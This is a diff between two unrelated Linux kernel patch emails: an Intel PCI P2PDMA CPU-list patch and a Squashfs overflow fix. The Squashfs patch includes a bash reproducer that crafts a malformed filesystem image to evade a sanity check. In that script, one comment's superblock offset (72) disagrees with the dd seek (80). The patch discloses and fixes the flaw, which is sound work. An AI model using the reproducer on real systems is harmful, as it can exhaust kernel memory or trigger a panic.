@@ -1,96 +1,80 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=192.198.163.9
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.28
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
 	t=1794440688;
-	b=QnfF4QZ8DT3/2uG2vMPWHJT2vqmgVLA50PeZ7Rgt00fVJPs2pIe+nEGU28+k1SeUPnAj
-	 KwvsNnMcAQXLMafiyXeJFcRhoDd/6CoU4JouUwIQcXvyVKI4Qt6VIfi0xfDPEK1E2IEkD
-	 sZ/1NPt0YmYxGc9FpOtn55pYFyZjMCCcY/DyrZMghjSGa6J5XWBL+QhlpwHHLgbadfaBQ
-	 euP57qT3J+zujHudCdDr3a2pBR01Hss/o62NPdtMKjv5MKRXWR/dwfY5ZarsD5SG/ggQU
-	 mBwg6XWB1t5gKS7qlcIgNh6CclGT7mds3qRwXSaLJSrnadgrqfzOBXppTtoq06g5fJw==
+	b=O03ZZpLPSPEJw7B/lX5b2OHPTCatOXpUYiBfGzR2/GG9+MqaSgZht1KUkYi+v2t/sEra
+	 RXyH7F+BT15sFaVAF3rRz2cBCwecHR59nrmw1BrCGrpz2NGMMzRgktmgAMQwbtthaP7fa
+	 M03cYzbaR4a0xx9qoxbyG/YOCNGaiAKM82I8tJ3Ik/xPvqCUxeCmTQkc846nkqIYaTAeL
+	 jqB1ey4RiTSl+4QFvANWZHA62CX2G4sSEylgT8MVyYZ9UPsyFgayWvEgNjQZPA1ldpKnj
+	 1ONYp1bDJqzkTNV6phNozAFF5boPOktGZpLmhkg0k+BI4znk+5dpOrMdjld0c2HATtw==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
 	a=rsa-sha256; c=relaxed/relaxed; t=1794440688;
-	h=DMARC-Filter:DKIM-Signature:X-CSE-ConnectionGUID:X-CSE-MsgGUID:
-	 X-IronPort-AV:X-IronPort-AV:Received:X-CSE-ConnectionGUID:
-	 X-CSE-MsgGUID:X-ExtLoop1:X-IronPort-AV:Received:From:To:Cc:Subject:
-	 Date:Message-ID:X-Mailer:In-Reply-To:References:MIME-Version:
-	 Content-Transfer-Encoding;
-	bh=QjkfhNnljBzuGrDTTeg8+Hg4if61ZIAEg5Uf4N2V+Q4=;
-	b=5p9sFkk0w0Tyy3SuOwLY+Jhbmuj0KQUnToQ+kEWZ3mdMNpD8W4Twrdp3KIAJDsmzd0IF
-	 aNkrKsIw6HKcDsUA/x8+3P0imYOKhrPQ7CcxppEe8RwpZ4i0+gx2NChtSY3SgNSIScmLQ
-	 BUE2EP3sxZ1+x8Id9Q4yx9kxOs18Fo5FKBH/xOIatMR7KhBVTO5cnbdX5XXb0W0JpvuXC
-	 45fnlvnwQYAIqHyMm79Dn1P1g64/B1jTZf0E1Ma9CykXicUtB5ls8aJkFmOgkUa42nxw4
-	 lAUAJpekvtY5kX+zUA6ohqtKuy/599WhZHJMQicqEggiGrYghKYd5Boh6fwzIYfKTfw==
+	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
+	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
+	 X-Mailer:In-Reply-To:References:MIME-Version:
+	 Content-Transfer-Encoding:X-CMAE-Envelope;
+	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
+	b=OkqS+8QUcIOPValXX9dKL68ckqz3gJCow+zEhBl2TLcAVie2T9M9KZxmq3LzZAuRbosG
+	 8Y8P0fte6AbztBPVJgBJbf/EusZZHpSK0wcWSt+mDFh29PSLAUBjNZY9pTdkh8z/NABgx
+	 KukgEoMCjYrXAX+6vbgUkJjIDNE73PasaezwkMdQaLEFmio5a6b3w887KA4tMcPqcEUZJ
+	 lkfWNAPzUoen7wrpeCmSmE/pvVeXHpQRSYd2b+Rqr03xn1GSqYtGBwcLgDqR2KWmurbyS
+	 HN7/zVfukzxskh2wy5Rq3LIMk1ck2o5carCe7/ffRivxibq+3Nr5WPHBMw6eHcGkyoA==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=intel.com;
-	spf=pass smtp.mailfrom=intel.com;
-	dkim=pass header.d=intel.com header.i=@intel.com header.a=rsa-sha256 header.s=Intel header.b=KV0Cd7zW;
-	arc=none smtp.remote-ip=192.198.163.9
-Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.9])
-	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
+	dmarc=pass header.from=squashfs.org.uk;
+	spf=pass smtp.mailfrom=squashfs.org.uk;
+	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=slZ9jt9z;
+	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=Vuw5Z5FH;
+	arc=none smtp.remote-ip=188.121.53.28
+Received: from sxplsmtpa04-03.prod.sxb1.secureserver.net (sxplsmtpa04-03.prod.sxb1.secureserver.net [188.121.53.28])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EB0A160A2637;
-	Wed, 11 Nov 2026 23:44:47 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org EB0A160A2637
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id ECC3260A2639
+	for <linux-kernel@vger.kernel.org>; Wed, 11 Nov 2026 23:44:47 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org ECC3260A2639
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.a=rsa-sha256 header.s=Intel header.b=KV0Cd7zW
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
-  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
-  t=1794440688; x=1825976688;
-  h=from:to:cc:subject:date:message-id:in-reply-to:
-   references:mime-version:content-transfer-encoding;
-  bh=U1MDFCgTAgpjswU78txZG/8/izNhkf0r3rSAPUmiHZ0=;
-  b=KV0Cd7zWtgo9qX2ufkaPghYGTqRlzguEz4orJgyWjlPZVjDGljgPo+y1
-   7k+H6OjA+E0OWivzAoyhHaxPfMo5eVKLyc76J2/ZNpuknbzI58R91JYTc
-   9xxNinktN3WL4VswizDNPTaK//nTJpAbljNbmuKfnmqEiIkL6oecEB1F5
-   vlR2cWg9hLuQWv1C5DanqFCwNRKx2FQb2GZRa6pWwm2LY39j/v5hKBFGr
-   qiDi5FFHcUMS4+abgviUgv+s5xPtuZlVm6t/K5jeEVYRwWQXccfPUI6Tl
-   GD5jx5xy4rv41czFZM+xQZy2w1LStCN5maMS5hyxZdi4lLbhKpIzAGqLT
-   Q==;
-X-CSE-ConnectionGUID: nOuq8PQFRUWWojGrfT+Xtg==
-X-CSE-MsgGUID: QSdKeBqrSGWF76tTn9gLBw==
-X-IronPort-AV: E=McAfee;i="6800,10657,11963"; a="3099122"
-X-IronPort-AV: E=Sophos;i="6.27,208,1787036400"; 
-   d="scan'208";a="3099122"
-Received: from fmviesa012.fm.intel.com ([10.60.135.152])
-  by fmvoesa103.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 11 Nov 2026 15:44:46 -0800
-X-CSE-ConnectionGUID: gOwC9/ZmTZCMmIufvKa+1Q==
-X-CSE-MsgGUID: H0iwglT+TQiBExPMgAOOqA==
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="6.27,208,1787036400"; 
-   d="scan'208";a="10241297"
-Received: from pavel-dev.sc.intel.com (HELO pepopov-mobl2.intel.com) ([10.3.206.11])
-  by fmviesa012.fm.intel.com with ESMTP; 11 Nov 2026 15:44:45 -0800
-From: Pavel Popov <pavel.e.popov@intel.com>
-To: Bjorn Helgaas <bhelgaas@google.com>,
-	Logan Gunthorpe <logang@deltatee.com>,
-	Arnd Bergmann <arnd@arndb.de>
-Cc: Pavel Popov <pavel.e.popov@intel.com>,
-	Leon Romanovsky <leon@kernel.org>,
-	Lukas Wunner <lukas@wunner.de>,
-	Thomas Gleixner <tglx@kernel.org>,
-	Ingo Molnar <mingo@redhat.com>,
-	Borislav Petkov <bp@alien8.de>,
-	Dave Hansen <dave.hansen@linux.intel.com>,
-	x86@kernel.org,
-	Jim Chow <jim.chow@broadcom.com>,
-	Radu Rugina <radu.rugina@broadcom.com>,
-	Alexey Makhalov <alexey.makhalov@broadcom.com>,
-	Wei Liu <wei.liu@kernel.org>,
-	Michael Kelley <mhklinux@outlook.com>,
-	Nathan Ciobanu <nathan.d.ciobanu@linux.intel.com>,
-	bcm-kernel-feedback-list@broadcom.com,
-	virtualization@lists.linux.dev,
-	linux-hyperv@vger.kernel.org,
-	linux-arch@vger.kernel.org,
-	linux-pci@vger.kernel.org,
-	linux-kernel@vger.kernel.org
-Subject: [PATCH v5 3/3] PCI/P2PDMA: Allow P2PDMA on Intel Xeon server CPUs
-Date: Wed, 11 Nov 2026 16:44:39 -0700
-Message-ID: <20261111234439.4098-4-pavel.e.popov@intel.com>
-X-Mailer: git-send-email 2.54.0
-In-Reply-To: <20261111234439.4098-1-pavel.e.popov@intel.com>
-References: <20261111234439.4098-1-pavel.e.popov@intel.com>
+	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=slZ9jt9z;
+	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=Vuw5Z5FH
+Received: from avalon.fritz.box ([82.69.79.175])
+	by :SMTPAUTH: with ESMTPA
+	id RHz6xtxIpLwCURHzbxAFYO; Wed, 11 Nov 2026 23:44:40 +0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
+	s=secureserver2; t=1794440681;
+	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
+	h=From:To:Cc:Subject:Date:In-Reply-To:References;
+	b=slZ9jt9zKsp3dBYJMMbRtyfAd+/DEMndzCEDvgvZTKEX/Ne3B9AJFa06+kTlU6c3p
+	 cEu5je+TfQUcytLZpzIWrJtrMI4ZWw9TfRvSiAi90ZOSnbPaPkZnAm5iu9DzKnMhDe
+	 8PN4o9dJs0mFeCSQA6vmKwvMgRIfiTNp62tneUg+8nQPAOq/JD3pQFVQZdNV4xbqE0
+	 DtwCfyjGft1FO+IExhrhKondr9bzwRIRTpL6erG/q3YY9ti09Qgnthk3vUN9SYdfW9
+	 BYa83NkZVrvRmIelKG2LIKeWehNZ2+5AFjrcGpZlLUT2PHTOhbJgt/Uf+o4cZioAU6
+	 axg9OWqbuN0Dg==
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
+	s=secureserver1; t=1794440681;
+	bh=r9eLjveMin1D2ZLNPwxfKt5MBfGoC53sknDXJOavBvI=;
+	h=From:To:Cc:Subject:Date:In-Reply-To:References;
+	b=Vuw5Z5FHrV2mjjDcw4csqBdBWLOdz86DYe0C/GDsoXUIE6B6SLiaS1Mq/y1tl9rk3
+	 YxzDMiw4Fjz+FP0K45odLRakmgqW013XFdntbA9292gYKvkhALk9AlSFN7EicM6jpu
+	 Vy4parJRjH5Ifs1QXfHJM/WSnp1YmILBoA4SQqpW5v3nc84Ffrbz0NeQKKd+kTi2FR
+	 UwwWxHppCnzTi0joLFgkOrxnUJuYpbA0guQB4KyAZ37OIgsh4ZCYa8hj4ZOsgEOhNL
+	 LZ4I3o08XVxOOl9VV2cLozmXxvOaqF5UQTRDhnnWYWA8BOQ+LLUNpbv0s3TrFVk/dB
+	 zFRCJaHPNkhag==
+X-CMAE-Analysis: v=2.4 cv=XZYcX455 c=1 sm=1 tr=0 ts=6af4fde9
+ a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
+ a=5M4-1oPrCebqpQMMblwA:9 a=UObqyxdv-6Yh2QiB9mM_:22
+Feedback-ID: ca609814b9c996260fd6cf0fc2955db6:squashfs.org.uk:ssnet
+X-SECURESERVER-ACCT: phillip@squashfs.org.uk
+From: Phillip Lougher <phillip@squashfs.org.uk>
+To: linux-kernel@vger.kernel.org,
+	linux-fsdevel@vger.kernel.org,
+	akpm@linux-foundation.org
+Cc: Phillip Lougher <phillip@squashfs.org.uk>
+Subject: [PATCH v2 09/22] Squashfs: fix fragment index table length too large exploit
+Date: Wed, 11 Nov 2026 23:43:49 +0000
+Message-ID: <20261111234402.252354-10-phillip@squashfs.org.uk>
+X-Mailer: git-send-email 2.47.3
+In-Reply-To: <20261111234402.252354-1-phillip@squashfs.org.uk>
+References: <20261111234402.252354-1-phillip@squashfs.org.uk>
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Post: <mailto:linux-kernel@vger.kernel.org>
@@ -101,79 +85,161 @@ List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
+X-CMAE-Envelope: MS4xfIS/rEqvR2VCARW5p1B1K1zRvoA+GT9W5J9wbeh9iF98IlWIf9ckHucOnTUxxRD7MkThnTVvQhre4OSeeoJHGfoUDdVt6asyj/IEohAvI42csF8LCdYP
+ IlJxKerqHzU8md0n5mdWa5jIxwWnCM5O10qgKH/cZu4oL1RxLjanQkSwToDY+EWWdFbE31ectfSJ8V1QQwkYJsBvXjYVFN4opOE+JLteLPpc2ljeTJsqdS6z
+ LEPf+a/G6a+w0lbjiOQ7QPRJZ+uwaH6O7R6DFr98a0Cr0mkqnEAgiOq9YnT1H2vUxZAwL1ZIxh/z5A73tDAVvzckVyaTqWWVqoQUur94sa8=
 
-Peer-to-Peer DMA (P2PDMA) between two devices requires either a shared
-upstream bridge or a host bridge matching pci_p2pdma_whitelist[]. In
-VMware guests, passthrough devices appear directly on virtual root
-buses without host bridge devices. In Hyper-V guests, each passthrough
-device appears in a PCI domain of its own without a host bridge
-device. Consequently, P2PDMA checks evaluate endpoint Device IDs
-against the host bridge whitelist, causing P2PDMA requests to fail
-regardless of host support.
+An attacker can manipulate the fragment count and the fragment table
+start values in the superblock, and force the code to kmalloc()
+a 4 Mbyte memory region, or try to allocate larger values which
+will fail with a warning, and which will panic the kernel if panic on
+warn is set.
 
-This affects discrete devices such as GPUs, NICs and NVMe drives.
+If the allocation succeeds, these invalid values will be caught when the
+code tries to read the data from disk, but, this leaves a small time
+window where the 4 Mbyte block is allocated before being freed when
+the mount of the filesystem fails.
 
-Add an explicit list of the Intel Xeon server generations from
-Skylake-SP to Diamond Rapids to cpu_supports_p2pdma(). These are the
-CPUs whose host bridges are in pci_p2pdma_whitelist[] without
-restrictions. AMD Zen and newer are already covered by
-cpu_supports_p2pdma(), so only Intel entries are needed.
+The exploit relies on arithmetic overflow to evade the following sanity
+check:
 
-Tested with the Intel Level Zero P2P benchmark (ze_peer) on Arc Pro B60
-cards in a Linux guest on VMware ESXi 9.0 (Emerald Rapids host).
+	if (fragment_table_start + length > next_table)
 
-Signed-off-by: Pavel Popov <pavel.e.popov@intel.com>
-Reviewed-by: Logan Gunthorpe <logang@deltatee.com>
+Specifically, the values of fragment_table_start and length can be
+chosen so that they overflow an unsigned long long, and so appear less
+than next_table.
+
+Typically, the maximum memory that can be allocated with kmalloc() is
+4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
+needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
+length.
+
+This value is beyond the end of any block device, because the maximum
+block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
+bytes).
+
+In practice this means such a large value will be caught when the code
+immediately after allocation tries to read the data off disk:
+
+ 	table = squashfs_read_table(sb, fragment_table_start, length);
+
+However, the code should check for validity before allocating a large
+kmalloc() area, because such allocations can cause memory pressure or
+cause the kernel to panic.
+
+This commit checks that fragment_tables_size is not too large, and
+ensures arithmetic overflow does not occur.
+
+It also makes the sanity check more exacting by utilising the fact that
+there should be zero gap between the end of the fragment index table and
+the next table.
+
+Reproducer
+=========
+
+The following script if the eploit works, will fail with the mount
+error
+
+mount: attempt to access beyond end of device
+
+=================================================================
+#!/bin/bash
+
+ARGS="-quiet -no-progress"
+
+finish() {
+	popd 2>&1 > /dev/null
+	rm -rf $DIR
+	exit 1
+}
+
+# Create a Squashfs filesystem with a single file.
+#
+DIR=$(mktemp -d)
+
+pushd $DIR 2>&1 > /dev/null
+
+echo Create the Squashfs filesystem
+
+if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
+	echo Failed to create Squashfs filesystem
+	finish
+
+fi
+
+# The fragments field (fragment count) in the superblock is at offset
+# 16 bytes.
+#
+# Over-write the fragments count with 268,435,456 little-endian.
+# This will make the kernel try to kmalloc() 4 Mbytes to hold the
+# fragment index table.
+#
+
+# Write 268,435,456 in little-endian format to file
+/usr/bin/echo -en "\x00\x00\x00\x10" > file
+
+# Over-write the fragments count in the superblock
+echo Over-write the fragments count in the superblock
+
+dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none
+
+# The fragment table start (start of the index table) in the superblock
+# is at offset 72 bytes.
+#
+# Over-write the value with 2^64 - 4 Mbytes little-endian.
+# This value with the index table length will overflow an unsigned
+# long long, giving the value 0.  This will evade the sanity check.
+
+# Write 2^64 - 4 Mbytes in little-endian format to file
+/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file
+
+# Over-write the fragment table start in the superblock
+echo Over-write the fragment table start in the superblock
+
+dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none
+
+# Mount the filesystem to /mnt
+echo Mount the filesystem to /mnt
+
+# If the eploit works, the mount will fail with
+# mount: attempt to access beyond end of device
+
+if ! mount -t squashfs img.sqsh /mnt; then
+	echo Mount of Squashfs filesystem failed
+	finish
+fi
+
+popd 2>&1 > /dev/null
+
+rm -rf $DIR
+=================================================================
+
+Fixes: 1cac63cc9b2f ("Squashfs: add sanity checks to fragment reading at mount time")
+Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
 ---
- drivers/pci/p2pdma.c | 21 +++++++++++++++++++++
- 1 file changed, 21 insertions(+)
+ fs/squashfs/fragment.c | 8 ++++----
+ 1 file changed, 4 insertions(+), 4 deletions(-)
 
-diff --git a/drivers/pci/p2pdma.c b/drivers/pci/p2pdma.c
-index 180fe5d6228..85e45bbe321 100644
---- a/drivers/pci/p2pdma.c
-+++ b/drivers/pci/p2pdma.c
-@@ -21,6 +21,8 @@
- #include <linux/seq_buf.h>
- #include <linux/xarray.h>
+diff --git a/fs/squashfs/fragment.c b/fs/squashfs/fragment.c
+index e945d045d55e..9f63e5b5c513 100644
+--- a/fs/squashfs/fragment.c
++++ b/fs/squashfs/fragment.c
+@@ -68,11 +68,11 @@ __le64 *squashfs_read_fragment_index_table(struct super_block *sb,
+ 	__le64 *table;
  
-+#include <asm/cpu_device_id.h>
-+
- struct pci_p2pdma {
- 	struct gen_pool *pool;
- 	bool p2pmem_published;
-@@ -521,6 +523,21 @@ static void seq_buf_print_bus_devfn(struct seq_buf *buf, struct pci_dev *pdev)
- }
+ 	/*
+-	 * Sanity check, length bytes should not extend into the next table -
+-	 * this check also traps instances where fragment_table_start is
+-	 * incorrectly larger than the next table start
++	 * The computed size of the index table (length bytes) should exactly
++	 * match the table start and end points
+ 	 */
+-	if (fragment_table_start + length > next_table)
++	if (fragment_table_start >= next_table ||
++				length != (next_table - fragment_table_start))
+ 		return ERR_PTR(-EINVAL);
  
- #ifdef CONFIG_X86
-+/* Intel Xeon CPUs whose host bridges support p2pdma */
-+static const struct x86_cpu_id p2pdma_intel_cpu_ids[] = {
-+	X86_MATCH_VFM(INTEL_SKYLAKE_X, NULL),
-+	X86_MATCH_VFM(INTEL_ICELAKE_X, NULL),
-+	X86_MATCH_VFM(INTEL_ICELAKE_D, NULL),
-+	X86_MATCH_VFM(INTEL_SAPPHIRERAPIDS_X, NULL),
-+	X86_MATCH_VFM(INTEL_EMERALDRAPIDS_X, NULL),
-+	X86_MATCH_VFM(INTEL_GRANITERAPIDS_X, NULL),
-+	X86_MATCH_VFM(INTEL_GRANITERAPIDS_D, NULL),
-+	X86_MATCH_VFM(INTEL_ATOM_CRESTMONT_X, NULL),
-+	X86_MATCH_VFM(INTEL_ATOM_DARKMONT_X, NULL),
-+	X86_MATCH_VFM(INTEL_DIAMONDRAPIDS_X, NULL),
-+	{}
-+};
-+
- static bool cpu_supports_p2pdma(void)
- {
- 	struct cpuinfo_x86 *c = &cpu_data(0);
-@@ -529,6 +546,10 @@ static bool cpu_supports_p2pdma(void)
- 	if (c->x86_vendor == X86_VENDOR_AMD && c->x86 >= 0x17)
- 		return true;
- 
-+	/* Listed Intel Xeon CPUs support p2pdma */
-+	if (x86_match_cpu(p2pdma_intel_cpu_ids))
-+		return true;
-+
- 	return false;
- }
- #else /* !CONFIG_X86 */
+ 	table = squashfs_read_table(sb, fragment_table_start, length);
 -- 
-2.54.0
+2.47.3
 
